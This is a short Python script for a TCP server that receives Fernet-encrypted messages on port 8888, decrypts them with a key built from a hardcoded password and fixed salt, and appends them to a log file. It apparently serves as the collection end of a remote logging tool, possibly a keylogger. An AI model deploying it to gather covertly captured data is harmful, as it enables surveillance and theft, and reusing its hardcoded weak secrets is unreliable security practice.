from socket import *
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

PORT = 8888
LOG_FILENAME = "log.txt"
PASSWORD = ("password").encode()

def decryptMsg(msg):
    salt = b'salt_'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(PASSWORD))
    f=Fernet(key)
    msg=msg[2:-1]
    msg=bytes(msg,'utf-8')
    decrypted_message=f.decrypt(msg)
    return str(decrypted_message.decode())

def save_to_file(log):
    with open(LOG_FILENAME, "a") as f:
        print(log, file=f)
    print("[+] log saved to file")
    
if __name__ == "__main__":
    serverSocket = socket(AF_INET, SOCK_STREAM)
    serverSocket.bind(('', PORT))
    serverSocket.listen(1)

    try:
        file = open(LOG_FILENAME, "r+")
        file.truncate(0);
        file.close();
    except:
        pass

    print("[+] server starting")

    while 1:
        try:
            connectionSocket, addr = serverSocket.accept()
            data = connectionSocket.recv(1024)
            data = decryptMsg(str(data))
            print(data)
            save_to_file(data)
        except KeyboardInterrupt:
            print("[-] server stopping")
            break
